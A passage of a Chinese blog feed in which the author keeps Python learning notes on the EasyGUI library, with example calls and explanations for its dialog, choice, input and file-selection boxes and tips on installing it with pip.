src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h2 id="二、显示文本"><a href="#二、显示文本" class="headerlink" title="二、显示文本"></a>二、显示文本</h2><p>EasyGUI 还提供函数用于显示文本。</p><p><strong>1 textbox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">textbox(msg=’’, title=’ ‘, text=’’, codebox=<span class="literal">False</span>, callback=<span class="literal">None</span>, run=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>textbox() 函数默认会以比例字体（参数 codebox=True 设置为等宽字体）来显示文本内容（自动换行），这个函数适合用于显示一般的书面文字。</p><p>注：text 参数设置可编辑文本区域的内容，可以是字符串、列表或者元祖类型。<br><strong>2 codebox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codebox(msg=’’, title=’ ‘, text=’’)</span><br></pre></td></tr></table></figure><p>codebox() 以等宽字体显示文本内容（不自动换行），相当于 textbox(codebox=True)</p><h2 id="三、目录与文件"><a href="#三、目录与文件" class="headerlink" title="三、目录与文件"></a>三、目录与文件</h2><p>GUI 编程中一个常见的场景是要求用户输入目录及文件名，EasyGUI 提供了一些基本函数让用户来浏览文件系统，选择一个目录或文件。<br><strong>.1 diropenbox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diropenbox(msg=<span class="literal">None</span>, title=<span class="literal">None</span>, default=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>diropenbox() 函数用于提供一个对话框，返回用户选择的目录名（带完整路径哦），如果用户选择 “Cancel” 则返回 None。</p><p>default 参数用于设置默认的打开目录（请确保设置的目录已存在）。</p><p><strong>2 fileopenbox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileopenbox(msg=<span class="literal">None</span>, title=<span class="literal">None</span>, default=’*’, filetypes=<span class="literal">None</span>, multiple=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>fileopenbox() 函数用于提供一个对话框，返回用户选择的文件名（带完整路径哦），如果用户选择 “Cancel” 则返回 None。<br>关于 default 参数的设置方法：</p><p>*<em>default 参数指定一个默认路径，通常包含一个或多个通配符。<br>如果设置了 default 参数，fileopenbox() 显示默认的文件路径和格式。<br>default 默认的参数是 ‘</em>’，即匹配所有格式的文件。**</p><p><strong>例如：<br>default=“c:/fishc/.py” 即显示 C:\fishc 文件夹下所有的 Python 文件。<br>default=”c:/fishc/test.py” 即显示 C:\fishc 文件夹下所有的名字以 test 开头的 Python 文件。</strong></p><p>关于 filetypes 参数的设置方法：</p><p>可以是包含文件掩码的字符串列表，例如：filetypes = [“.txt”]<br>可以是字符串列表，列表的最后一项字符串是文件类型的描述，例如：filetypes = [“.css”, [“.htm”, “.html”, “HTML files”]]</p><p>最后是 multiple 参数，如果为 True 则表示可以同时选择多个文件。<br><strong>3 filesavebox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesavebox(msg=<span class="literal">None</span>, title=<span class="literal">None</span>, default=’’, filetypes=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>filesavebox() 函数提供一个对话框，让用于选择文件需要保存的路径（带完整路径哦），如果用户选择 “Cancel” 则返回 None。</p><p>default 参数应该包含一个文件名（例如当前需要保存的文件名），当然也可以设置为空的，或者包含一个文件格式掩码的通配符。</p><p>filetypes 参数的设置方法请参考 fileopenbox() 函数。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于EasyGui的学习就到此为止吧 接下来要学习 类和对象  以及模块等的学习 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录6----EasyGui中一些好玩的地方2</title>
      <link href="/2021/05/16/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%956----EasyGui%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B92/"/>
      <url>/2021/05/16/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%956----EasyGui%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B92/</url>
      
        <content type="html"><![CDATA[<font color=#999AAA ></font><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><h1 id="一、如何在buttonbox里边显示图片"><a href="#一、如何在buttonbox里边显示图片" class="headerlink" title="一、如何在buttonbox里边显示图片"></a>一、如何在buttonbox里边显示图片</h1><p>当我们调用一个buttonbox()函数 <strong>(如msgbox(),ynbox(),indexbox()等)的时候</strong>，还可以为关键字参数image赋值，可以设置一个.gif或者.png格式的图像:<br><strong>话不多说 直接上代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.buttonbox(<span class="string">&#x27;如果我是DJ你会爱我吗?&#x27;</span>,image=<span class="string">&#x27;123.png&#x27;</span>,choices=(<span class="string">&#x27;爱&#x27;</span>,<span class="string">&#x27;不爱&#x27;</span>,<span class="string">&#x27;$%%%%@#&#x27;</span>))</span><br></pre></td></tr></table></figure><p>程序实现 如下:</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210512224858456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>其实 说句实话 完成这一步其实花了我很多的时间 <strong>1.是不知道应该把图片放在哪里  2.是不知道为什么显示不了图片</strong></p><p><strong>解决方案</strong><br>多在网上找资料 实在解决不了可以问问认识的大牛 帮你解决<br><strong>图片必须是png或者gif的形式  并且要和你的py文件放在一个路径下<br>用pycharm编译器的话可以自动选择图片的url</strong></p><p>至于显示不了图片 可以参考这篇博客<a href="https://blog.csdn.net/weixin_44067083/article/details/100048817?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162083121516780261943526%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162083121516780261943526&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-100048817.pc_search_result_no_baidu_js&utm_term=buttonbox%E5%8A%A0%E8%BD%BD%E4%B8%8D%E4%BA%86%E5%9B%BE%E7%89%87">解决buttonbox不显示图片的问题</a></p><h2 id="二、为用户提供一系列选项"><a href="#二、为用户提供一系列选项" class="headerlink" title="二、为用户提供一系列选项"></a>二、为用户提供一系列选项</h2><p><strong>buttonbox()**的几个函数为用户提供了一个简单的按钮选项，但如果有很多选项，或者选项的内容特别长的话，更好的策略是为它们提供一个可选择的列表。<br>**choicebox()与multchoicebox()——可选的下拉列表</strong><br><strong>（1）choicebox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.choicebox(msg=<span class="string">&#x27;上大学是为了什么?&#x27;</span>,title=<span class="string">&#x27;&#x27;</span>,choices=[<span class="string">&quot;为了理想&quot;</span>,<span class="string">&quot;为了以后多挣钱&quot;</span>,<span class="string">&quot;只是随便玩玩&quot;</span>])`</span><br></pre></td></tr></table></figure><p><strong>choicebox()函数</strong>为用户提供了一个可选择的列表，使用序列（元组或列表）作为选项，这些选项会按照字母进行排序。<br>程序实现如下：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210516185458358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>(2)multchoicebox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.multchoicebox(msg=<span class="string">&#x27;上大学是为了什么?&#x27;</span>,title=<span class="string">&#x27;&#x27;</span>,choices=[<span class="string">&quot;为了理想&quot;</span>,<span class="string">&quot;为了以后多挣钱&quot;</span>,<span class="string">&quot;只是随便玩玩&quot;</span>])</span><br></pre></td></tr></table></figure><p>multchoicebox()函数也是提供一个可选择的列表，与choicebox（）不同的是，mutlchoicebox（）支持用户选择0个、1个或者同时选择多个选项。<br>multchoicebox（）函数也是使用序列（元组或列表）作为选项，这些选项显示前会按照不区分大小写的方法排好序：<br>程序实现如下：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210516190134891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>同样的内容  用了不同的函数  我们就可以实现两种不一样的功能</strong>  </p><h2 id="三、让用户输入消息"><a href="#三、让用户输入消息" class="headerlink" title="三、让用户输入消息"></a>三、让用户输入消息</h2><p><strong>(1）enterbox()—–文本输入框</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enterbox(msg=<span class="string">&#x27; Enter something. &#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, default=<span class="string">&#x27; &#x27;</span>, strip=<span class="literal">True</span>, image=<span class="literal">None</span>, root=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>msg：需要显示的内容<br>title：窗口的标题<br>default：关键字定义的是文本框默认值<br>strip：的值为True时会自动忽略输入的首尾空格，False则相反<br>image：显示图片（需要路径）</p><p>enterbox()函数为用户提供一个最简单的输入框，返回值为用户输入的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.enterbox(msg=<span class="string">&#x27; 对今天的自己你想说什么 &#x27;</span>, title=<span class="string">&#x27; 每日一问&#x27;</span>, default=<span class="string">&#x27; &#x27;</span>, strip=<span class="literal">True</span>, image=<span class="literal">None</span>, root=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>程序实现如图：</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210516190936640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>（2）integerbox()—数字输入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">integerbox(msg=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, lowerbound=<span class="number">0</span>, upperbound=<span class="number">99</span>, image=<span class="literal">None</span>, root=<span class="literal">None</span>,)</span><br></pre></td></tr></table></figure><p>msg：需要显示的内容<br>title：窗口的标题<br>default：关键字定义的是文本框默认值<br>lowerbound：输入的最小值<br>upperbound：输入的最大值<br>image：显示图片（需要路径）</p><p>返回值：<br> 输入内容后返回值为输入的数字<br> 点击Cancel按钮返回None<br> 右上角×号返回None<br>输入数值超出范围时会给出提示后从新输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.integerbox(msg=<span class="string">&#x27;猜猜我的幸运数字&#x27;</span>, title=<span class="string">&#x27; 数字游戏&#x27;</span>, default=<span class="string">&#x27;7&#x27;</span>, lowerbound=<span class="number">0</span>, upperbound=<span class="number">99</span>, image=<span class="literal">None</span>, root=<span class="literal">None</span>,)</span><br></pre></td></tr></table></figure><p>程序实现如下：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210516192700307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>(3)multenterbox()—多选项输入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multenterbox(msg=<span class="string">&#x27; &#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, fields=(), values=())</span><br></pre></td></tr></table></figure><p>msg：需要显示的内容<br>title：窗口的标题<br>fields：填写条目名称<br>values：默认内容</p><p>返回值：<br> 输入内容后返回值为输入的内容，以列表的形式<br> 点击Cancel按钮返回None<br> 右上角×号返回None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.multenterbox(msg=(<span class="string">&#x27;请输入下列信息&#x27;</span>), title=<span class="string">&#x27;账号中心 &#x27;</span>, fields=([<span class="string">&#x27;用户名&#x27;</span>,<span class="string">&#x27;真实姓名&#x27;</span>,<span class="string">&#x27;电话&#x27;</span>,<span class="string">&#x27;QQ&#x27;</span>,<span class="string">&#x27;Wechat&#x27;</span>]), values=())</span><br></pre></td></tr></table></figure><p>程序实现如下：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210516194437689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录5 ---- EasyGui中的一些好玩的地方1</title>
      <link href="/2021/05/03/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%955%20----%20EasyGui%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B91/"/>
      <url>/2021/05/03/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%955%20----%20EasyGui%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B91/</url>
      
        <content type="html"><![CDATA[<font color=#999AAA ></font><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><p><font color=#999AAA >之前简单的介绍了EasyGui这个东西 那么这节就来讲一讲它里面的更好玩的地方<br></font></p><h1 id="一、默认参数和关键字参数"><a href="#一、默认参数和关键字参数" class="headerlink" title="一、默认参数和关键字参数"></a>一、默认参数和关键字参数</h1><h2 id="1-1修改默认参数"><a href="#1-1修改默认参数" class="headerlink" title="1.1修改默认参数"></a>1.1修改默认参数</h2><p>对于EasyGui的所有对话框而言，<strong>前两个参数都是消息主题和对话框标题</strong><br><strong>对话框标题默认是一个空字符串，而消息主题通常会有一个简单的默认值。</strong></p><p>默认参数使得可以尽可能去地少设置参数，例如<strong>msgbox()函数标题部分的参数是可选的</strong><br>因此来调用msgbox()函数的时候只需要指定一个消息参数即可，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line">eg.msgbox(<span class="string">&quot;EDG加油&quot;</span>)</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210420195606803.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>但是如果我们想让它变得更具体一点的话，可以指定标题参数和消息参数，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line">eg.msgbox(<span class="string">&quot;EDG加油&quot;</span>，<span class="string">&quot;淀粉心声&quot;</span>)</span><br></pre></td></tr></table></figure><p>程序实现如图：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210420195809467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>这样修改默认参数就成功了</strong></p><h2 id="1-2使用关键字参数"><a href="#1-2使用关键字参数" class="headerlink" title="1.2使用关键字参数"></a>1.2使用关键字参数</h2><p>调用EasyGui函数还可以使用关键字参数，现在假设需要使用一个按钮组件，但不想指定标题参数（第二个参数），仍可以使用关键字参数的方法指定<strong>choices参数</strong>（第三个参数）的值，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">choices=[<span class="string">&quot;找到女朋友&quot;</span>,<span class="string">&quot;拿到好成绩&quot;</span>,<span class="string">&quot;无欲无求&quot;</span>]</span><br><span class="line">reply =eg.choicebox(<span class="string">&quot;2021年最想完成什么&quot;</span>,choices=choices)</span><br></pre></td></tr></table></figure><p>程序实现如图：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210420201951647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h1 id="二、使用按钮组件"><a href="#二、使用按钮组件" class="headerlink" title="二、使用按钮组件"></a>二、使用按钮组件</h1><h2 id="2-1-EasyGui在buttonbox-上的函数的调用"><a href="#2-1-EasyGui在buttonbox-上的函数的调用" class="headerlink" title="2.1 EasyGui在buttonbox()上的函数的调用"></a>2.1 EasyGui在buttonbox()上的函数的调用</h2><p><strong>(1)msgbox()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgbox(msg=<span class="string">&#x27;(Your message goes here)&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, ok_button=<span class="string">&#x27;OK&#x27;</span>, image=None, root=None)</span><br></pre></td></tr></table></figure><p> <strong>msgbox() 显示一个消息和提供一个 “OK” 按钮，可以指定任意的消息和标题，甚至可以重写 “OK” 按钮的内容。<br>  重写 “OK” 按钮最简单的方法是使用关键字参数：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line">eg.msgbox(<span class="string">&quot;学会Pyhon&quot;</span>,ok_button=<span class="string">&quot;继续努力&quot;</span>)</span><br></pre></td></tr></table></figure><p>程序实现如下:<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210424165102557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>(2)ccbox()</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccbox(msg=<span class="string">&#x27;Shall I continue?&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, choices=(<span class="string">&#x27;C[o]ntinue&#x27;</span>, <span class="string">&#x27;C[a]ncel&#x27;</span>), image=None, default_choice=<span class="string">&#x27;C[o]ntinue&#x27;</span>, cancel_choice=<span class="string">&#x27;C[a]ncel&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ccbox()函数提供一个选择:C[0]ntinue或者C[a]ncel,并相应返回True或者False.<br><strong>注意：“C[o]ntinue” 中的 [o] 表示快捷键，也就是说当用户在键盘上敲一下 o 字符，就相当于点击了 “C[o]ntinue” 按键。</strong></p><p><strong>(3)ynbox()</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ynbox(msg=<span class="string">&#x27;Shall I continue?&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, choices=(<span class="string">&#x27;[&lt;F1&gt;]Yes&#x27;</span>, <span class="string">&#x27;[&lt;F2&gt;]No&#x27;</span>), image=None, default_choice=<span class="string">&#x27;[&lt;F1&gt;]Yes&#x27;</span>, cancel_choice=<span class="string">&#x27;[&lt;F2&gt;]No&#x27;</span>)</span><br></pre></td></tr></table></figure><p>跟 ccbox() 一样，只不过这里默认的 choices 参数值不同而已，[] 表示将键盘上的 F1 功能按键作为 “Yes” 的快捷键使用。</p><p><strong>(4)buttonbox()</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buttonbox(msg=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, choices=(<span class="string">&#x27;Button[1]&#x27;</span>, <span class="string">&#x27;Button[2]&#x27;</span>, <span class="string">&#x27;Button[3]&#x27;</span>), image=None, images=None, default_choice=None, cancel_choice=None, callback=None, run=True)</span><br></pre></td></tr></table></figure><p>可以使用 buttonbox() 定义自己的一组按钮，buttonbox() 会显示一组由你自定义的按钮。<br>当用户点击任意一个按钮的时候，buttonbox() 返回按钮的文本内容。<br>如果用户点击取消或者关闭窗口，那么会返回默认选项（第一个选项）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line">eg.buttonbox(msg=<span class="string">&quot;晚饭想要吃什么&quot;</span>,title=<span class="string">&quot;三选一&quot;</span>,choices=(<span class="string">&quot;火锅&quot;</span>,<span class="string">&quot;烧肉&quot;</span>,<span class="string">&quot;蛋糕&quot;</span>))</span><br></pre></td></tr></table></figure><p>程序实现如下:<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210424171907549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>(5)indexbox()</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">indexbox(msg=<span class="string">&#x27;Shall I continue?&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, choices=(<span class="string">&#x27;Yes&#x27;</span>, <span class="string">&#x27;No&#x27;</span>), image=None, default_choice=<span class="string">&#x27;Yes&#x27;</span>, cancel_choice=<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure><p>基本跟 buttonbox() 一样，区别就是当用户选择第一个按钮的时候返回序号 0， 选择第二个按钮的时候返回序号 1。<br><strong>(6)boolbox()</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boolbox(msg=<span class="string">&#x27;Shall I continue?&#x27;</span>, title=<span class="string">&#x27; &#x27;</span>, choices=(<span class="string">&#x27;[Y]es&#x27;</span>, <span class="string">&#x27;[N]o&#x27;</span>), image=None, default_choice=<span class="string">&#x27;Yes&#x27;</span>, cancel_choice=<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果第一个按钮被选中则返回 True，否则返回 False。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录4---图形用户界面入门 easygui</title>
      <link href="/2021/05/01/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%954---%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%85%A5%E9%97%A8%20easygui/"/>
      <url>/2021/05/01/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%954---%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%85%A5%E9%97%A8%20easygui/</url>
      
        <content type="html"><![CDATA[<p>﻿</p><font color=#999AAA ></font><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >在玩爬虫之前有很多的事情要去准备 ，首先是最基本的Python知识，这是我们必须要掌握的。可以跟着网上的一些视频多看多练，我是跟着小甲鱼FishC来学习Python   练习重于视频</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p><font color=#999AAA >还是很想分享一句话：学习本来就是一个枯燥的过程，要学会自己从枯燥中找快乐！</p><h1 id="一、Easygui的介绍以及安装会出现的问题"><a href="#一、Easygui的介绍以及安装会出现的问题" class="headerlink" title="一、Easygui的介绍以及安装会出现的问题"></a>一、Easygui的介绍以及安装会出现的问题</h1><p><strong>Easygui</strong>  是在Python社区中的一个简单的GUI模块：也就是一种图形用户界面编程<br>EasyGui官网目前已经迁移到了GitHub上：<br><a href="https://github.com/robertlugg/easygui">EasyGui的下载地址</a></p><p>由于现在可以使用pip工具直接安装EasyGui了（<strong>pip是Python的包管理工具，提供了对Python包的查找、下载、安装、卸载的功能），打开CMD命令行窗口 输入pip install easygui 即可</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419130524807.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>这是网上最常见也最简单的一种 方法了 但是 我在安装easygui的时候却遇到了不少问题</p><h2 id="1-pip指令用不了"><a href="#1-pip指令用不了" class="headerlink" title="1.pip指令用不了"></a>1.pip指令用不了</h2><p><a href="https://blog.csdn.net/qq_21516633/article/details/101995249?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161880880016780269839615%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161880880016780269839615&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-101995249.pc_search_result_no_baidu_js&utm_term=%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E7%9A%84pip%E7%94%A8%E4%B8%8D%E4%BA%86">解决pip用不了的方法1</a><br><a href="https://blog.csdn.net/songlh1234/article/details/82882386?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161880880016780269839615%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161880880016780269839615&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82882386.pc_search_result_no_baidu_js&utm_term=%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E7%9A%84pip%E7%94%A8%E4%B8%8D%E4%BA%86">解决pip用不了的方法2</a></p><h2 id="2-当我们有了pip-但是可能会出现版本太低不能使用-于是升级pip"><a href="#2-当我们有了pip-但是可能会出现版本太低不能使用-于是升级pip" class="headerlink" title="2.当我们有了pip 但是可能会出现版本太低不能使用 于是升级pip"></a>2.当我们有了pip 但是可能会出现版本太低不能使用 于是升级pip</h2><p><strong>本来觉得有了pip那么我们就应该可以很轻松的安装EasyGui了吧  其实不然</strong><img "" 